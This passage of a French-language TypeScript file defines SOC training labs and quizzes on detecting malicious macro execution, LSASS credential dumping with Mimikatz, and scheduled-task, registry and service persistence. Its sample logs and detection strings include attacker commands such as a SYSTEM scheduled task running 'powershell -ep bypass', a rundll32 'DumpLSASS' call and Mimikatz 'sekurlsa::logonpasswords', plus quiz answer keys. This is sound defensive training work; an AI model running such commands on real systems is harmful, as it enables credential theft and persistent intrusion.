          expectedOutput: "Note: Nécessite de cibler le bon PID, pas tous les svchost!"
        },
        {
          description: "Supprimer la clé Run",
          command: "reg delete 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v 'svchost' /f",
          expectedOutput: "L'opération a réussi"
        },
        {
          description: "Supprimer le malware",
          command: "del /F /Q 'C:\\Users\\paul.martin\\AppData\\Local\\Temp\\svchost.exe'",
          expectedOutput: "Fichier supprimé"
        },
        {
          description: "Vérifier d'autres systèmes",
          command: 'file.hash.sha256:"{hash_du_malware}" | stats count by host.name',
          expectedOutput: "1 système uniquement (WKS-COMPTA-015)"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Pourquoi isoler AVANT de terminer les processus?",
          type: "multiple-choice",
          options: ["Pour préserver les preuves", "Pour empêcher le malware de se propager", "Pour éviter que le malware se défende", "Toutes ces raisons"],
          correctAnswer: "Toutes ces raisons",
          explanation: "L'isolation empêche la propagation, préserve l'état pour forensic, et empêche les réactions du malware"
        },
        {
          id: "ex4-2",
          question: "Comment identifier le FAUX svchost.exe parmi les vrais?",
          type: "multiple-choice",
          options: ["Par le nom", "Par le chemin (System32 vs autre)", "Par la taille du fichier", "Par la couleur de l'icône"],
          correctAnswer: "Par le chemin (System32 vs autre)",
          explanation: "Le vrai svchost.exe est UNIQUEMENT dans C:\\Windows\\System32"
        }
      ],
      tips: [
        "ATTENTION: ne pas kill tous les svchost.exe, seulement le malveillant!",
        "Utilisez le PID spécifique pour être précis",
        "Après éradication, faites un scan AV/EDR complet"
      ],
      checkpoint: "Système isolé, malware terminé et supprimé, persistence éliminée.",
      estimatedTime: "15 min"
    },
    {
      id: 5,
      title: "Documentation et Amélioration",
      objective: "Documenter l'incident et renforcer les défenses",
      theory: `## Post-Incident

### Actions de suivi:
1. **Rapport d'incident**: Documentation complète
2. **Règles de détection**: Créer/améliorer
3. **Recommandations**: Hardening
4. **Sensibilisation**: Former l'utilisateur
5. **Threat Intel**: Partager les IOCs

### Recommandations typiques:
- Désactiver les macros Office
- Implémenter AMSI
- PowerShell Constrained Language Mode
- Application Whitelisting`,
      scenario: `Finalisez l'incident et documentez vos recommandations.`,
      tasks: [
        "Compléter le rapport d'incident",
        "Lister tous les IOCs",
        "Créer une règle de détection",
        "Proposer des mesures de hardening"
      ],
      exercises: [
        {
          id: "ex5-1",
          question: "Quelle mesure empêcherait COMPLÈTEMENT cette attaque?",
          type: "multiple-choice",
          options: ["Antivirus mis à jour", "Désactiver les macros Office sauf signées", "Formation des utilisateurs", "Firewall"],
          correctAnswer: "Désactiver les macros Office sauf signées",
          explanation: "Sans macro, Excel ne peut pas lancer PowerShell - l'attaque est bloquée à la source"
        },
        {
          id: "ex5-2",
          question: "Quelle règle Sigma pourrait détecter cette attaque?",
          type: "multiple-choice",
          options: ["Process parent Office + enfant script engine", "Toute exécution PowerShell", "Tout fichier Excel ouvert", "Connexion réseau sortante"],
          correctAnswer: "Process parent Office + enfant script engine",
          explanation: "La combinaison Office → script (PowerShell, CMD, wscript) est le pattern spécifique à détecter"
        }
      ],
      tips: [
        "Les IOCs de cet incident peuvent aider à détecter des attaques similaires",
        "La désactivation des macros a un impact business - proposer des alternatives",
        "PowerShell Constrained Language Mode limite les capacités malveillantes"
      ],
      checkpoint: "TP terminé! Incident documenté avec IOCs, règles et recommandations.",
      estimatedTime: "5 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "Quel paramètre PowerShell indique une commande encodée en base64?",
      type: "multiple-choice",
      options: ["-ep bypass", "-enc ou -encodedcommand", "-nop", "-w hidden"],
      correctAnswer: "-enc ou -encodedcommand",
      explanation: "-enc permet de passer une commande encodée en base64 UTF-16LE"
    },
    {
      id: "final-2",
      question: "La chaîne WINWORD.EXE → cmd.exe → powershell.exe indique probablement...",
      type: "multiple-choice",
      options: ["Mise à jour Office", "Macro malveillante", "Plugin légitime", "Erreur système"],
      correctAnswer: "Macro malveillante",
      explanation: "Word ne lance jamais cmd ou PowerShell normalement - c'est une macro malveillante"
    },
    {
      id: "final-3",
      question: "IEX en PowerShell signifie...",
      type: "text",
      correctAnswer: "Invoke-Expression",
      hint: "IEX est un alias de...",
      explanation: "IEX = Invoke-Expression, exécute la chaîne comme du code"
    },
    {
      id: "final-4",
      question: "Un svchost.exe dans C:\\Users\\Public est...",
      type: "multiple-choice",
      options: ["Normal", "Mise à jour système", "Malware utilisant le masquerading", "Copie de sauvegarde"],
      correctAnswer: "Malware utilisant le masquerading",
      explanation: "Le vrai svchost.exe n'existe QUE dans System32"
    },
    {
      id: "final-5",
      question: "Quelle technique MITRE pour 'Excel lance PowerShell'?",
      type: "text",
      correctAnswer: "T1204.002",
      hint: "T1204 est User Execution, .002 est...",
      explanation: "T1204.002 = User Execution: Malicious File (l'utilisateur ouvre le fichier malveillant)"
    }
  ],
  passingScore: 80,
  certification: "Analyste Execution N2",
  tags: ["execution", "powershell", "macros", "T1059", "T1204"]
};

// ============================================
// TP 3: CREDENTIAL ACCESS - LSASS Dump (T1003)
// ============================================
export const labCredentialAccess: Lab = {
  id: "tp-credential-access",
  sopId: "mitre-credential-access",
  title: "TP: Détection du Vol de Credentials",
  description: "Apprenez à détecter les tentatives de vol de credentials via LSASS, SAM, et DCSync. Cas pratique avec Mimikatz.",
  category: "Credential Access",
  difficulty: "Avancé",
  duration: "75 min",
  prerequisites: [
    "Connaissance de l'authentification Windows",
    "Compréhension de LSASS et SAM",
    "Expérience avec le SIEM/EDR"
  ],
  objectives: [
    "Détecter les accès suspects à LSASS",
    "Identifier les techniques de credential dumping",
    "Comprendre les alertes EDR associées",
    "Répondre efficacement à une compromission de credentials"
  ],
  scenario: {
    context: "L'EDR a détecté un accès suspect au processus LSASS depuis un processus non-système. Cette alerte est critique car LSASS contient les hashes des mots de passe des utilisateurs connectés.",
    alertData: {
      "Date/Heure": "2026-03-04 22:45:12 UTC",
      "Serveur": "SRV-DC-01",
      "Process Source": "rundll32.exe",
      "Target Process": "lsass.exe",
      "Access Mask": "0x1FFFFF (PROCESS_ALL_ACCESS)",
      "Utilisateur": "admin.temp",
      "Alert": "LSASS Memory Read"
    },
    timeline: [
      "22:30 - Connexion RDP avec compte admin.temp",
      "22:42 - Upload de fichier C:\\temp\\debug.dll",
      "22:45 - rundll32.exe accède à LSASS",
      "22:45 - Alerte EDR générée"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Comprendre l'Alerte LSASS",
      objective: "Analyser pourquoi cette alerte est critique",
      theory: `## LSASS et le Vol de Credentials

### Qu'est-ce que LSASS?
**L**ocal **S**ecurity **A**uthority **S**ubsystem **S**ervice
- Gère l'authentification Windows
- Stocke les credentials en mémoire
- Les hashes NTLM sont accessibles si on peut lire sa mémoire

### Pourquoi c'est critique:
- Accès à LSASS = accès aux hashes de TOUS les utilisateurs connectés
- Pass-the-Hash permet l'authentification avec juste le hash
- Sur un DC: accès aux credentials du domaine entier

### Access Masks suspects:
| Access Mask | Signification |
|-------------|---------------|
| 0x1FFFFF | PROCESS_ALL_ACCESS (très suspect) |
| 0x1010 | PROCESS_VM_READ + QUERY (dumping) |
| 0x0410 | PROCESS_QUERY_INFORMATION (moins critique) |`,
      scenario: `L'alerte montre un accès avec 0x1FFFFF (PROCESS_ALL_ACCESS) à LSASS depuis rundll32.exe.`,
      tasks: [
        "Comprendre la signification de PROCESS_ALL_ACCESS",
        "Identifier pourquoi rundll32.exe est suspect",
        "Évaluer la criticité de cette alerte"
      ],
      commands: [
        {
          description: "Rechercher les accès LSASS",
          command: 'event.code:10 AND winlog.event_data.TargetImage:"*lsass.exe" AND host.name:"SRV-DC-01" | table @timestamp, winlog.event_data.SourceImage, winlog.event_data.GrantedAccess',
          expectedOutput: "rundll32.exe - 0x1FFFFF à 22:45:12"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Pourquoi un accès à LSASS sur un DC est-il particulièrement grave?",
          type: "multiple-choice",
          options: ["Le DC stocke les credentials de tout le domaine", "Le DC est plus lent", "Le DC a peu d'espace disque", "Ce n'est pas plus grave"],
          correctAnswer: "Le DC stocke les credentials de tout le domaine",
          explanation: "Un dump LSASS sur un DC peut exposer les credentials de TOUS les utilisateurs du domaine"
        },
        {
          id: "ex1-2",
          question: "rundll32.exe accédant à LSASS est-il normal?",
          type: "multiple-choice",
          options: ["Oui, c'est son rôle", "Non, jamais normal", "Oui pour les mises à jour", "Dépend de l'heure"],
          correctAnswer: "Non, jamais normal",
          explanation: "rundll32.exe ne devrait JAMAIS accéder à LSASS - c'est une technique d'attaque courante"
        }
      ],
      tips: [
        "Les processus légitimes qui accèdent à LSASS: lsm.exe, csrss.exe, services.exe",
        "Tout autre processus accédant à LSASS est suspect",
        "L'heure (22:45) hors horaires de bureau renforce la suspicion"
      ],
      checkpoint: "Alerte critique confirmée: accès non autorisé à LSASS sur le DC.",
      estimatedTime: "10 min"
    },
    {
      id: 2,
      title: "Analyse de la Chaîne d'Attaque",
      objective: "Reconstituer comment l'attaquant est arrivé là",
      theory: `## Reconstitution de l'Attaque

Pour comprendre l'impact total, il faut remonter la chaîne:

### Questions à répondre:
1. Comment l'attaquant a-t-il obtenu l'accès initial?
2. Quel compte a-t-il utilisé?
3. Depuis quelle machine?
4. Que s'est-il passé avant l'attaque sur LSASS?

### Sources de logs:
- **Security 4624**: Logon events
- **Security 4672**: Special privileges assigned
- **Sysmon 11**: File creation
- **Sysmon 1**: Process creation`,
      scenario: `L'alerte mentionne un compte "admin.temp" et un fichier "debug.dll" uploadé. Investigons.`,
      tasks: [
        "Rechercher l'origine de la connexion admin.temp",
        "Analyser le fichier debug.dll",
        "Reconstituer la timeline complète"
      ],
      commands: [
        {
          description: "Logon de admin.temp",
          command: 'winlog.event_id:4624 AND winlog.event_data.TargetUserName:"admin.temp" AND host.name:"SRV-DC-01" | table @timestamp, winlog.event_data.IpAddress, winlog.event_data.LogonType',
          expectedOutput: "22:30 - IP: 192.168.10.50 - LogonType: 10 (RDP)"
        },
        {
          description: "Création du fichier dll",
          command: 'host.name:"SRV-DC-01" AND event.code:11 AND file.path:"*debug.dll*"',
          expectedOutput: "22:42 - C:\\temp\\debug.dll créé"
        },
        {
          description: "Commande rundll32",
          command: 'host.name:"SRV-DC-01" AND process.name:"rundll32.exe" AND process.args:"*debug.dll*"',
          expectedOutput: "rundll32.exe C:\\temp\\debug.dll,DumpLSASS"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "LogonType 10 signifie...",
          type: "multiple-choice",
          options: ["Connexion console", "Connexion RDP", "Connexion réseau", "Service"],
          correctAnswer: "Connexion RDP",
          explanation: "Type 10 = RemoteInteractive = RDP"
        },
        {
          id: "ex2-2",
          question: "D'où vient la connexion RDP (IP)?",
          type: "text",
          correctAnswer: "192.168.10.50",
          hint: "Regardez le champ IpAddress du logon event",
          explanation: "192.168.10.50 est la machine depuis laquelle l'attaquant s'est connecté"
        },
        {
          id: "ex2-3",
          question: "Le fonction 'DumpLSASS' dans la DLL indique...",
          type: "multiple-choice",
          options: ["Une fonction système", "Un outil malveillant de credential dumping", "Un debugger légitime", "Un plugin Office"],
          correctAnswer: "Un outil malveillant de credential dumping",
          explanation: "Le nom de fonction explicite révèle l'intention malveillante"
        }
      ],
      tips: [
        "Toujours remonter à l'accès initial",
        "LogonType aide à comprendre le vecteur d'attaque",
        "Les fichiers uploadés doivent être analysés (sandbox, VT)"
      ],
      checkpoint: "Chaîne reconstituée: RDP depuis 192.168.10.50 → upload DLL → dump LSASS",
      estimatedTime: "15 min"
    },
    {
      id: 3,
      title: "Analyse du Malware",
      objective: "Analyser la DLL malveillante",
      theory: `## Analyse de DLL Malveillante

### Outils d'analyse:
- **VirusTotal**: Réputation et détections
- **Any.run/Joe Sandbox**: Analyse dynamique
- **YARA**: Signatures de familles de malware
- **strings**: Extraction des chaînes

### Signatures de credential dumpers:
- Mimikatz: "sekurlsa", "kerberos", "privilege::debug"
- Pypykatz: "pypykatz", "lsadump"
- Procdump: "procdump", "-ma lsass"`,
      scenario: `La DLL debug.dll doit être analysée pour confirmer sa nature.`,
      tasks: [
        "Calculer le hash de la DLL",
        "Soumettre à VirusTotal",
        "Extraire les strings suspects"
      ],
      commands: [
        {
          description: "Hash de la DLL",
          command: "certutil -hashfile C:\\temp\\debug.dll SHA256",
          expectedOutput: "SHA256: 3a7b9c8d1e2f4a5b6c7d8e9f0a1b2c3d4e5f6789..."
        },
        {
          description: "Recherche VirusTotal",
          command: "curl -s 'https://www.virustotal.com/vtapi/v2/file/report?apikey=API&resource={hash}'",
          expectedOutput: "positives: 58/72 - Trojan.Mimikatz"
        },
        {
          description: "Strings suspects",
          command: "strings C:\\temp\\debug.dll | grep -iE 'sekurlsa|kerberos|password|dump'",
          expectedOutput: "sekurlsa::logonpasswords, privilege::debug"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Le hash SHA256 permet de...",
          type: "multiple-choice",
          options: ["Identifier uniquement le fichier sur VT", "Bloquer le fichier partout", "Vérifier l'intégrité uniquement", "Identifier le fichier ET bloquer sur le parc"],
          correctAnswer: "Identifier le fichier ET bloquer sur le parc",
          explanation: "Le hash permet l'identification sur VT ET le blocage via IOC sur tous les systèmes"
        },
        {
          id: "ex3-2",
          question: "Les strings 'sekurlsa' et 'logonpasswords' sont caractéristiques de...",
          type: "text",
          correctAnswer: "Mimikatz",
          hint: "L'outil de credential dumping le plus connu",
          explanation: "Ce sont des commandes Mimikatz pour dumper les credentials de LSASS"
        },
        {
          id: "ex3-3",
          question: "58/72 détections sur VT signifie...",
          type: "multiple-choice",
          options: ["Fichier clean", "Fichier suspect à vérifier", "Certainement malveillant", "Erreur VT"],
          correctAnswer: "Certainement malveillant",
          explanation: "58 antivirus sur 72 détectent le fichier = certainement malveillant"
        }
      ],
      tips: [
        "Toujours analyser les fichiers en sandbox, jamais sur votre poste",
        "Les strings peuvent révéler beaucoup sur la fonction du malware",
        "Mimikatz est souvent repackagé pour éviter la détection"
      ],
      checkpoint: "Malware confirmé: variante de Mimikatz avec 58 détections sur VT.",
      estimatedTime: "15 min"
    },
    {
      id: 4,
      title: "Évaluation de l'Impact et Containment",
      objective: "Déterminer quels credentials sont compromis et contenir",
      theory: `## Impact d'un Dump LSASS

### Credentials exposés:
- **Tous les utilisateurs connectés** au moment du dump
- Leurs hashes NTLM
- Potentiellement des tickets Kerberos
- Potentiellement des mots de passe en clair (WDigest)

### Sur un DC, cela peut inclure:
- Compte Domain Admin
- Compte KRBTGT (Golden Ticket possible!)
- Comptes de service

### Actions immédiates:
1. Isoler le système compromis
2. Identifier les comptes exposés
3. Réinitialiser les mots de passe
4. Révoquer les sessions`,
      scenario: `Le dump LSASS sur SRV-DC-01 a été effectué. Évaluez l'impact.`,
      tasks: [
        "Identifier qui était connecté au moment du dump",
        "Évaluer les privilèges des comptes exposés",
        "Vérifier si le compte KRBTGT est compromis",
        "Isoler et contenir"
      ],
      commands: [
        {
          description: "Sessions actives au moment du dump",
          command: 'winlog.event_id:4624 AND host.name:"SRV-DC-01" AND @timestamp <= "2026-03-04T22:45:00" AND @timestamp >= "2026-03-04T20:00:00" | table winlog.event_data.TargetUserName, winlog.event_data.LogonType | dedup winlog.event_data.TargetUserName',
          expectedOutput: "admin.temp, DOMAIN\\domain.admin, DOMAIN\\svc.backup"
        },
        {
          description: "Vérifier privilèges",
          command: "Get-ADGroupMember -Identity 'Domain Admins' | Select Name",
          expectedOutput: "domain.admin est Domain Admin!"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Un Domain Admin était connecté au DC lors du dump. Quel est l'impact?",
          type: "multiple-choice",
          options: ["Impact minimal", "Impact critique - accès total au domaine possible", "Impact moyen", "Pas d'impact supplémentaire"],
          correctAnswer: "Impact critique - accès total au domaine possible",
          explanation: "Avec le hash d'un Domain Admin, l'attaquant peut accéder à N'IMPORTE QUEL système du domaine"
        },
        {
          id: "ex4-2",
          question: "Si le compte KRBTGT est compromis, que peut faire l'attaquant?",
          type: "multiple-choice",
          options: ["Rien de spécial", "Créer des Golden Tickets", "Seulement lire les emails", "Redémarrer les serveurs"],
          correctAnswer: "Créer des Golden Tickets",
          explanation: "Golden Ticket = accès illimité au domaine, même après reset des mots de passe normaux!"
        },
        {
          id: "ex4-3",
          question: "Quelle est la PREMIÈRE action de containment?",
          type: "multiple-choice",
          options: ["Éteindre le DC", "Isoler le DC tout en le gardant allumé", "Réinitialiser les mots de passe", "Analyser le malware"],
          correctAnswer: "Isoler le DC tout en le gardant allumé",
          explanation: "Isoler pour stopper la propagation, mais garder allumé pour préserver les preuves en RAM"
        }
      ],
      tips: [
        "Ne JAMAIS éteindre avant d'avoir fait une image mémoire si possible",
        "Réinitialiser KRBTGT DEUX FOIS avec 10h d'intervalle si compromise",
        "Tous les comptes connectés au DC doivent changer de mot de passe"
      ],
      checkpoint: "Impact critique: Domain Admin compromis. DC isolé, reset des mots de passe initié.",
      estimatedTime: "15 min"
    },
    {
      id: 5,
      title: "Remédiation et Documentation",
      objective: "Compléter la remédiation et documenter l'incident",
      theory: `## Remédiation Post-Credential Dump

### Actions obligatoires:
1. **Reset mot de passe** de TOUS les comptes exposés
2. **Reset KRBTGT** si DC compromis (2x avec 10h intervalle)
3. **Audit des activités** des comptes depuis le dump
4. **Recherche de persistence** sur le DC et machine source
5. **Blocage des IOCs** sur le parc

### Recommandations hardening:
- Credential Guard
- Protected Users group pour les admins
- LAPS pour les mots de passe locaux
- Tiering AD (Tier 0/1/2)`,
      scenario: `Finalisez la remédiation et documentez l'incident.`,
      tasks: [
        "Confirmer que tous les mots de passe sont réinitialisés",
        "Vérifier qu'aucune persistence n'existe",
        "Documenter l'incident complet",
        "Proposer des recommandations de hardening"
      ],
      exercises: [
        {
          id: "ex5-1",
          question: "Pourquoi réinitialiser KRBTGT DEUX fois avec 10h d'intervalle?",
          type: "multiple-choice",
          options: ["C'est une politique Microsoft arbitraire", "Le hash précédent reste valide comme backup", "Une seule fois ne fonctionne pas", "Pour les performances"],
          correctAnswer: "Le hash précédent reste valide comme backup",
          explanation: "Windows garde le hash N-1 valide. Il faut donc reset 2 fois pour invalider les deux versions."
        },
        {
          id: "ex5-2",
          question: "Quelle technique empêcherait TOTALEMENT un dump LSASS?",
          type: "multiple-choice",
          options: ["Antivirus", "Credential Guard", "Firewall", "Aucune ne peut l'empêcher totalement"],
          correctAnswer: "Credential Guard",
          explanation: "Credential Guard isole les secrets dans une VM sécurisée inaccessible même à SYSTEM"
        },
        {
          id: "ex5-3",
          question: "La technique MITRE pour un dump LSASS est...",
          type: "text",
          correctAnswer: "T1003.001",
          hint: "T1003 est OS Credential Dumping, .001 est...",
          explanation: "T1003.001 = LSASS Memory"
        }
      ],
      tips: [
        "Credential Guard nécessite du hardware compatible (HVCI)",
        "Protected Users désactive WDigest et autres protocoles faibles",
        "Le tiering AD empêche l'exposition des admins sur des workstations"
      ],
      checkpoint: "TP terminé! Incident complet documenté avec IoCs, timeline et recommandations.",
      estimatedTime: "20 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "Quel processus accède légitimement à LSASS?",
      type: "multiple-choice",
      options: ["rundll32.exe", "powershell.exe", "csrss.exe", "notepad.exe"],
      correctAnswer: "csrss.exe",
      explanation: "csrss.exe est un processus système légitime qui peut accéder à LSASS"
    },
    {
      id: "final-2",
      question: "Un accès LSASS avec GrantedAccess 0x1010 signifie...",
      type: "multiple-choice",
      options: ["Lecture normale", "PROCESS_VM_READ - probablement un dump", "Écriture", "Suppression"],
      correctAnswer: "PROCESS_VM_READ - probablement un dump",
      explanation: "0x1010 = PROCESS_VM_READ + QUERY_INFORMATION, typique d'un dump mémoire"
    },
    {
      id: "final-3",
      question: "Dans quel cas doit-on réinitialiser le mot de passe KRBTGT?",
      type: "multiple-choice",
      options: ["À chaque mise à jour Windows", "Si un DC est compromis", "Une fois par an", "Jamais"],
      correctAnswer: "Si un DC est compromis",
      explanation: "La compromission d'un DC peut exposer KRBTGT, permettant des Golden Tickets"
    },
    {
      id: "final-4",
      question: "'sekurlsa::logonpasswords' est une commande de...",
      type: "text",
      correctAnswer: "Mimikatz",
      hint: "L'outil de credential dumping le plus connu",
      explanation: "C'est la commande Mimikatz pour extraire les credentials de LSASS"
    },
    {
      id: "final-5",
      question: "Pass-the-Hash utilise...",
      type: "multiple-choice",
      options: ["Le mot de passe en clair", "Le hash NTLM", "Un certificat", "Une clé SSH"],
      correctAnswer: "Le hash NTLM",
      explanation: "PtH utilise le hash NTLM directement pour s'authentifier sans connaître le mot de passe"
    }
  ],
  passingScore: 85,
  certification: "Analyste Credential Access N3",
  tags: ["credential-access", "LSASS", "Mimikatz", "T1003", "domain-admin"]
};

// ============================================
// TP 4: PERSISTENCE - Scheduled Tasks (T1053)
// ============================================
export const labPersistence: Lab = {
  id: "tp-persistence",
  sopId: "mitre-persistence",
  title: "TP: Détection de Mécanismes de Persistence",
  description: "Apprenez à identifier les techniques de persistence utilisées par les attaquants: tâches planifiées, services, registres.",
  category: "Persistence",
  difficulty: "Intermédiaire",
  duration: "55 min",
  prerequisites: [
    "Connaissance du Task Scheduler Windows",
    "Compréhension du registre Windows",
    "Accès aux logs Sysmon et Security"
  ],
  objectives: [
    "Identifier les mécanismes de persistence courants",
    "Analyser les tâches planifiées suspectes",
    "Détecter les modifications de registre malveillantes",
    "Remédier aux mécanismes de persistence"
  ],
  scenario: {
    context: "Suite à une compromission détectée hier, l'équipe IR suspecte que l'attaquant a établi des mécanismes de persistence. Votre mission est d'identifier tous les points de persistence sur le serveur compromis.",
    alertData: {
      "Date/Heure": "2026-03-09 08:15:00 UTC",
      "Serveur": "SRV-APP-001",
      "Alerte": "Création de tâche planifiée suspecte",
      "Process": "schtasks.exe",
      "Utilisateur": "SYSTEM",
      "Task Name": "WindowsUpdateCheck",
      "Trigger": "Daily at 02:00 AM"
    },
    timeline: [
      "03:00 - Compromission initiale via RDP",
      "03:15 - Exécution de reconnaissance",
      "03:30 - Création de tâche planifiée",
      "03:35 - Modification du registre Run",
      "03:40 - Création de service suspect",
      "08:15 - Détection par le SOC"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Énumération des Tâches Planifiées",
      objective: "Identifier toutes les tâches planifiées suspectes",
      theory: `## Tâches Planifiées (T1053.005)

Les tâches planifiées sont un mécanisme de persistence favori car elles:
- Survivent aux redémarrages
- S'exécutent avec des privilèges définis
- Peuvent être déclenchées sur divers événements

### Indicateurs de tâches suspectes:
| Indicateur | Description |
|------------|-------------|
| Nom générique | WindowsUpdate, SystemCheck |
| Auteur SYSTEM | Créée sans utilisateur légitime |
| Action script | Exécute PowerShell, CMD |
| Déclenchement nocturne | 02:00-05:00 AM |
| Chemin suspect | Temp, AppData, ProgramData |

### Commandes d'analyse:
\`\`\`cmd
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
\`\`\``,
      scenario: `Une tâche planifiée nommée "WindowsUpdateCheck" a été créée à 03:30 AM. Analysez-la.`,
      tasks: [
        "Lister toutes les tâches planifiées",
        "Identifier les tâches créées récemment",
        "Examiner l'action de chaque tâche suspecte",
        "Vérifier le compte d'exécution"
      ],
      commands: [
        {
          description: "Rechercher les créations de tâches (Sysmon Event 1)",
          command: 'host.name:"SRV-APP-001" AND process.name:"schtasks.exe" AND process.args:"/create"',
          expectedOutput: "schtasks /create /tn WindowsUpdateCheck /tr 'powershell -ep bypass -f C:\\ProgramData\\update.ps1' /sc daily /st 02:00 /ru SYSTEM"
        },
        {
          description: "Logs Task Scheduler (Event ID 4698)",
          command: 'host.name:"SRV-APP-001" AND event.code:4698',
          expectedOutput: "TaskName: WindowsUpdateCheck, TaskContent: <Actions><Exec>..."
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Quel Event ID indique la création d'une tâche planifiée?",
          type: "multiple-choice",
          options: ["4624", "4698", "4688", "4672"],
          correctAnswer: "4698",
          explanation: "Event ID 4698 = A scheduled task was created"
        },
        {
          id: "ex1-2",
          question: "La tâche s'exécute sous quel compte?",
          type: "text",
          correctAnswer: "SYSTEM",
          hint: "Regardez le paramètre /ru",
          explanation: "SYSTEM = privilèges maximum, très suspect"
        }
      ],
      tips: [
        "Event 4698 = création, 4699 = suppression",
        "Les tâches légitimes ont généralement un auteur Microsoft"
      ],
      checkpoint: "Tâche suspecte identifiée: WindowsUpdateCheck",
      estimatedTime: "12 min"
    },
    {
      id: 2,
      title: "Analyse du Registre Windows",
      objective: "Détecter les clés de registre de persistence",
      theory: `## Clés de Registre de Persistence (T1547.001)

### Clés d'auto-démarrage principales:
\`\`\`
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
\`\`\`

### Indicateurs suspects:
- Valeurs pointant vers Temp/AppData
- Noms génériques (svchost, update, system)
- Binaires non signés`,
      scenario: `L'attaquant a probablement modifié le registre pour persister. Identifiez les modifications.`,
      tasks: [
        "Rechercher les modifications de clés Run",
        "Analyser les événements Sysmon 13",
        "Vérifier les clés Winlogon"
      ],
      commands: [
        {
          description: "Modifications du registre (Sysmon 13)",
          command: 'host.name:"SRV-APP-001" AND event.code:13 AND registry.path:*CurrentVersion\\\\Run*',
          expectedOutput: "SetValue | HKLM\\...\\Run | SecurityUpdate | C:\\Windows\\Temp\\svc.exe"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Quel Sysmon Event ID correspond aux modifications de registre?",
          type: "multiple-choice",
          options: ["11", "12", "13", "14"],
          correctAnswer: "13",
          explanation: "Sysmon 12 = CreateKey, 13 = SetValue, 14 = RenameKey"
        }
      ],
      tips: [
        "HKLM affecte tous les utilisateurs, HKCU uniquement l'utilisateur courant"
      ],
      checkpoint: "Persistence registre détectée: SecurityUpdate dans Run",
      estimatedTime: "12 min"
    },
    {
      id: 3,
      title: "Analyse des Services Windows",
      objective: "Identifier les services malveillants créés",
      theory: `## Services Windows (T1543.003)

Les services offrent une persistence robuste car ils:
- Démarrent automatiquement au boot
- S'exécutent avec des privilèges SYSTEM
- Sont difficiles à détecter parmi les centaines existants

### Indicateurs de services malveillants:
| Indicateur | Description |
|------------|-------------|
| Chemin inhabituel | Pas dans System32 |
| Pas de description | Services légitimes ont des descriptions |
| Nom générique | WindowsHelper, UpdateChecker |
| Binaire non signé | Pas de signature Microsoft |`,
      scenario: `Un service suspect "UpdateService" a été créé. Analysez-le.`,
      tasks: [
        "Rechercher la création du service",
        "Analyser le binaire associé",
        "Vérifier la signature numérique"
      ],
      commands: [
        {
          description: "Création de service (Event 7045)",
          command: 'host.name:"SRV-APP-001" AND event.code:7045',
          expectedOutput: "Service Name: UpdateService | Service File Name: C:\\ProgramData\\updater.exe"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Quel Event ID indique la création d'un service?",
          type: "multiple-choice",
          options: ["4697", "7045", "4688", "4624"],
          correctAnswer: "7045",
          explanation: "Event 7045 = nouveau service installé"
        }
      ],
      tips: [
        "Event 7045 = installation, 7036 = changement d'état"
      ],
      checkpoint: "Service malveillant identifié: UpdateService",
      estimatedTime: "10 min"
    },
    {
      id: 4,
      title: "Remédiation et Documentation",
      objective: "Supprimer les mécanismes de persistence",
      theory: `## Stratégie de Remédiation

### Ordre de remédiation:
1. **Isoler** le système si nécessaire
2. **Documenter** tous les IOCs trouvés
3. **Supprimer** les mécanismes dans l'ordre inverse
4. **Vérifier** qu'ils ne reviennent pas
5. **Monitorer** pendant 24-48h

### Commandes de suppression:
\`\`\`powershell
# Tâche planifiée
schtasks /delete /tn "WindowsUpdateCheck" /f

# Clé de registre
Remove-ItemProperty -Path "HKLM:\\...\\Run" -Name "SecurityUpdate"

# Service
sc stop UpdateService
sc delete UpdateService
\`\`\``,
      scenario: `Vous avez identifié 3 mécanismes de persistence. Remédiez-les.`,
      tasks: [
        "Supprimer la tâche planifiée",
        "Nettoyer les clés de registre",
        "Arrêter et supprimer le service"
      ],
      commands: [
        {
          description: "Supprimer la tâche planifiée",
          command: "schtasks /delete /tn 'WindowsUpdateCheck' /f",
          expectedOutput: "SUCCESS: The scheduled task was successfully deleted."
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Combien de temps monitorer après remédiation?",
          type: "multiple-choice",
          options: ["1 heure", "24-48 heures", "1 semaine", "1 mois"],
          correctAnswer: "24-48 heures",
          explanation: "24-48h permet de couvrir les triggers quotidiens"
        }
      ],
      tips: [
        "Faites une sauvegarde du registre avant modification"
      ],
      checkpoint: "Tous les mécanismes supprimés et documentés",
      estimatedTime: "15 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "T1053.005 correspond à quelle technique?",
      type: "multiple-choice",
      options: ["Scheduled Task/Job", "Registry Run Keys", "Windows Service", "Boot Scripts"],
      correctAnswer: "Scheduled Task/Job",
      explanation: "T1053 = Scheduled Task/Job"
    },
    {
      id: "final-2",
      question: "Quel outil crée des tâches planifiées en CLI?",
      type: "text",
      correctAnswer: "schtasks",
      hint: "Commence par 'sch'",
      explanation: "schtasks.exe est l'outil CLI"
    },
    {
      id: "final-3",
      question: "Event ID 7045 indique...",
      type: "multiple-choice",
      options: ["Connexion", "Création de processus", "Installation de service", "Modification registre"],
      correctAnswer: "Installation de service",
      explanation: "Event 7045 = nouveau service"
    }
  ],
  passingScore: 80,
  certification: "Analyste Persistence N2",
  tags: ["persistence", "scheduled-tasks", "registry", "services", "T1053", "T1547", "T1543"]
};

// ============================================
// TP 5: LATERAL MOVEMENT (T1021)
// ============================================
export const labLateralMovement: Lab = {
  id: "tp-lateral-movement",
  sopId: "mitre-lateral-movement",
